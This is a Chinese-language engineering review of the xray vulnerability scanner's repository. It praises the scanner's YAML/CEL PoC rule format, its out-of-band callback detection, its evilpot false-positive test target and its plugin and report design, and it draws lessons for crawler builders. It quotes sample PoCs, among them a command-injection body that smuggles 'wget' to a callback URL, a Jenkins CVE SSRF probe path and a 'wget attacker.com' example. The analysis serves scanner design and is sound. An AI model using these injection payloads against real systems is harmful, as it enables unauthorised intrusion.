# xray 项目亮点分析

> 用"好品味"标准逐项打分：🟢 好品味 / 🟡 凑合 / 🔴 垃圾
> 每个亮点都回答三个问题：解决了什么真问题？数据结构是什么？能不能抄到自己的爬虫里？

---

## 亮点一：用 YAML+CEL 把"漏洞检测逻辑"变成数据，而不是代码 🟢🟢🟢

### 真问题

漏洞检测规则的数量级是"每天新增"的（CVE 层出不穷），如果每加一条规则都要改一次 Go 代码、重新编译、重新发版，这个项目根本没法运营。这是安全扫描器领域最核心的工程矛盾：**代码迭代速度 vs 规则迭代速度不匹配**。

### 数据结构

一条 PoC 的本质只有三层：

```
set:        变量池（常量/随机数/反连句柄）
rules:      若干条"发包 -> 判断表达式 -> 提取输出"的原子规则
expression: 用布尔逻辑把多条 rule 的结果组合成最终判定
```

```yaml
name: poc-yaml-jenkins-cve-2018-1000600
set:
    reverse: newReverse()          # 申请一个反连（DNSLog/HTTP）句柄
    reverseUrl: reverse.url
rules:
    r0:
        request:
            path: /securityRealm/user/admin/.../createTokenByPassword?apiUrl={{reverseUrl}}
        expression: response.status == 200 && reverse.wait(5)   # CEL 表达式判定
expression: r0()                    # 规则组合表达式，支持 && || !
```

**这就是好品味**：没有为"某种特殊漏洞类型"设计专属字段，SQLi、RCE、SSRF、指纹识别全部复用同一套 `set/rules/expression` 三段式结构。特殊情况（不同漏洞类型的判断逻辑）被下沉到了"表达式"这个统一接口里，而不是变成 if/else 分支。

对比一个反例思路（很多入门爬虫/扫描器会这样写）：

```go
// 🔴 垃圾写法：每加一种漏洞类型就加一个 if 分支和一套硬编码逻辑
if vulnType == "sqli" {
    checkSQLi(url, param)
} else if vulnType == "xss" {
    checkXSS(url, param)
} else if vulnType == "rce" {
    checkRCE(url, param)
}
```

xray 的做法是把"发什么包"和"怎么判断"都变成可以在运行时加载的数据（YAML 文本），Go 引擎只负责一件事：**解释执行**。这样加一条新规则 = 加一个文件，零编译、零发版、社区随便提交 PR。

### 能抄到自己爬虫里的点

如果你在做爬虫/扫描类工具，凡是"判断逻辑经常变化"的地方（比如：反爬识别规则、页面解析规则、内容分类规则），都应该考虑：
1. 把判断逻辑外置成 YAML/JSON 规则文件
2. 引入一个轻量表达式引擎（Go 生态推荐 `google/cel-go`，与 xray 用的是同一个库；也可以用 `antonmedv/expr`）
3. 规则文件与代码分离部署，代码只写"解释器"，不写"业务规则"

## 亮点二：反连（Out-of-Band）机制把"无回显漏洞"这个特殊情况变成正常情况 🟢🟢

### 真问题

大部分 RCE/SSRF/XXE 漏洞利用后**服务端不会把执行结果直接返回给你**（比如 `wget attacker.com`，你的 HTTP 响应体里什么都看不到）。传统做法要么放弃检测，要么写各种平台专属的旁路技巧，全是特殊情况。

### 设计

xray 把"反连"封装成一等公民对象：

```yaml
set:
    reverse: newReverse()      # 分配一个带唯一标识的反连域名/URL
    reverseURL: reverse.url
rules:
    r0:
        request:
            body: ...ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20{{reverseURL}}
        expression: response.status == 200 && reverse.wait(5)   # 轮询等待外部平台回连
```

不管是命令注入、SSRF、XXE 还是反序列化，判断方式统一收敛成：**发出带唯一标识的外连请求 → 等待反连平台报告是否命中**。这是把"能不能拿到回显"这个环境差异，从检测逻辑里彻底剥离出去，丢给统一的基础设施（反连平台）去解决。

### 能抄的点

如果你的爬虫要探测"某个动作是否真实触发了副作用"（例如：探测目标是否真的发起了出站请求、探测某接口是否有 SSRF），与其在业务代码里为每种协议写检测分支，不如做一个统一的"外部可观测锚点"服务（哪怕最简单的形式：自建一个记录访问日志的 HTTP 服务/DNS 服务），把"是否被访问"作为统一判定接口。

## 亮点三：evilpot —— 用一个"故意撒谎"的靶场倒逼插件质量 🟢🟢🟢（本仓库最有创意的部分）

### 真问题

误报是所有自动化扫描器的头号敌人。规则写得越"激进"，误报率越高；写得越保守，漏报率越高。传统办法是人工 review 每条规则，成本高且主观。

### 设计（这是全仓库工程品味最高的一段代码）

`tests/evilpot` 起了三个服务：

| 端口 | 名称 | 行为 |
|---|---|---|
| 8888 | evil (普通模式) | 响应体里塞满常见误报诱因：1-1000 的 md5/sha1/base64、常见错误码文案、常见登录框 HTML、常见 XML 头、还会真的执行请求里的四则运算表达式、真的 `sleep()` 对应的秒数 |
| 8887 | evil-hard (困难模式) | 在普通模式基础上，把请求体按分隔符拆词，对每个词单独算 md5/sha1/base64 后塞进响应，外加内嵌 `/etc/passwd`、`win.ini` 的内容 |
| 8889 | echo | 原样回显所有收到的数据（长度型、内容比对型误判的天敌） |

```go
// 核心机制：对请求里出现的表达式，服务端真的会执行
sleepMatches := sleepRe.FindAllStringSubmatch(unescape, -1)
for _, match := range sleepMatches {
    sleepTime, _ := strconv.Atoi(match[1])
    time.Sleep(time.Second * time.Duration(sleepTime))   // 真 sleep，戳穿"基于时间盲注延迟"的规则
}

mathRe.FindAllString(match, -1)   // 真计算 1+1，戳穿"基于回显表达式结果判断成功"的规则
```

**这是典型的"好品味"思路**：与其写一份 checklist 让人工审查"这条规则会不会因为响应里恰好有个 404 字样就误判"，不如直接构造一个把所有已知误报陷阱都塞进响应的靶场，让扫描器自己跑一遍——**跑出结果就是插件有问题，这是唯一标准，没有特殊情况需要人工判断**。

甚至连"时间盲注"和"表达式回显判断"这类高级检测手段的漏洞也被反向利用：靶场真的睡眠、真的算数，专门用来戳破那些偷懒的规则（比如你的规则只要检测到响应里出现了 `sleep(5)` 字符串就直接判定漏洞存在，而不去真正验证延迟）。

### 能抄的点

如果你在做爬虫/反爬测试，或者写内容抽取规则，同样可以反过来构造一个"陷阱页面"：
- 页面里塞满你的抽取规则最容易误判的内容（比如假的价格、假的分页按钮、假的登录墙、编码错乱的文本）
- 把"新规则/新 Pipeline 是否会在陷阱页面上产生错误结果"做成一个可自动化跑的回归测试
- 这比写一堆单元测试断言更贴近真实场景，而且能持续复用、持续加陷阱

## 亮点四：webhook 插件系统——20 行代码实现的"开闭原则" 🟢🟢

### 真问题

用户想要在扫描器发现漏洞后做各种自定义动作（发钉钉、写数据库、触发工单），但这些需求千差万别，不可能全部塞进主程序。

### 数据结构 + 机制

```python
# executor/registry.py —— 反射式插件加载，全部代码
def import_class(cl):
    d = cl.rfind(".")
    class_name = cl[d + 1:len(cl)]
    m = __import__(cl[0:d], globals(), locals(), [class_name])
    return getattr(m, class_name)

def init_plugin(config: Config):
    for cls, conf in config.plugin_config.items():
        if not conf.enabled:
            continue
        if "." not in cls:
            cls = cls + ".Plugin"          # 约定优于配置：默认类名 Plugin
        p = import_class("plugins." + cls)
        _plugin_registry.append(p(**conf.args))
```

三个关键决策：

1. **单一抽象基类** `BasePlugin`，三个钩子方法 `process_web_vuln / process_service_vuln / process_statistics`，默认空实现（`pass`），插件只需重写自己关心的
2. **通过 YAML 配置声明启用哪些插件及其初始化参数**，新增插件 = 新增一个 Python 文件 + 改一行配置，主程序（`app.py`/`executor.py`）代码零改动
3. **线程池异步分发** (`ThreadPoolExecutor`)，某个插件抛异常只会被 `pool_task_wrapper` 捕获打日志，不影响其他插件、不影响主 webhook 响应

```python
def dispatch_web_vuln(instance: str, vuln: WebVuln):
    for p in _plugin_registry:
        pool.submit(pool_task_wrapper, p.process_web_vuln, instance, vuln)
```

这是标准的**发布订阅 + 插件注册表**模式，用最朴素的语言特性（反射 import、鸭子类型）实现，没有引入任何框架或 DI 容器，符合"实用主义"——不用为了理论上的可扩展性去引入复杂的插件框架。

### 能抄的点

自己写爬虫时如果需要"抓到数据后的下游处理可扩展"（存储到不同的 DB、推送不同的消息队列、触发不同的告警），这套三十行代码的插件注册表模式直接可以照搬到 Go/Python 项目里，比引入重量级插件框架更合适。

## 亮点五：报告系统——单文件 HTML，为"内网离线可看"这个真实约束而设计 🟡🟢

### 真问题

安全报告经常需要在客户内网、离线环境查看，不能依赖 CDN、不能有额外静态资源文件夹（容易在传输中丢失）。

### 设计

`report/vue.config.js` 里的关键配置：

```js
optimization: { splitChunks: false },      // 强制不分包，只出一个 js
plugins: [ new HTMLInlineSourceWebpackPlugin() ],  // 把 js/css inline 进 html
chainWebpack: config => {
  config.plugin('html').tap(args => {
    args[0].inlineSource = '.(js|css)$'
    return args
  })
}
```

构建产物是**一个自包含的 `dist/index.html`**，把扫描结果以 `<script>webVulns.push(...)</script>` 的形式直接写入 HTML 注释/脚本标签中，双击即可在任意机器上打开查看，不依赖网络、不依赖 Node 环境。

`public/index.html` 里甚至保留了调试用的注释数据样例，方便二次开发时直接看到真实渲染效果。

### 能抄的点

如果你的爬虫/扫描工具需要产出报告给非技术人员或者要脱离运行环境查看，"单 HTML 文件、数据内嵌"是一个性价比极高的方案，比要求对方装 Node.js 起服务、或者维护一套在线报告系统轻量得多。

## 亮点六：CI 门禁把"PoC 质量"当代码质量一样卡 🟢

`.github/workflows/check_poc.yml` 直接下载官方发布的 xray 二进制，调用其内置的 `poclint` 子命令，对每个提交做 5 类检查：`filename, filepath, yamlschema, yamllint, cellint`（文件命名规范、路径规范、YAML Schema 校验、YAML lint、CEL 表达式语法检查）。

**亮点在于工具复用**：不需要另外写一个独立的 lint 工具/脚本，而是把"规则校验器"作为主程序自带子命令一并发布，PR 门禁直接调用发布产物自检，维护成本几乎为零。

## 总评

| 模块 | 品味评分 | 一句话点评 |
|---|---|---|
| PoC YAML DSL | 🟢🟢🟢 | 数据与代码分离的教科书级案例 |
| 反连机制 | 🟢🟢 | 用统一抽象消除"有无回显"这个特殊情况 |
| evilpot 靶场 | 🟢🟢🟢 | 用可复现的"陷阱环境"代替主观 code review，是本仓库最值得学习的工程思想 |
| webhook 插件系统 | 🟢🟢 | 极简注册表模式，没有过度设计 |
| report 前端 | 🟡🟢 | 针对性解决了离线可看的真实约束，但 Vue2 + 已过时依赖版本略显陈旧 |
| CI PoC 门禁 | 🟢 | 工具自举（dogfooding），维护成本低 |

**没有发现明显的"红色"（垃圾）设计**——因为这本来就不是核心引擎代码，暴露出来的都是经过打磨的、面向社区协作优化过的部分。这也说明一个道理：**开源出来给别人抄的代码，往往是团队精心挑选过的门面，真正的脏活累活（并发调度、内存管理、HTTP 底层实现）都在闭源核心里**，这点在你借鉴时要有清醒认知，不要神化这个仓库。
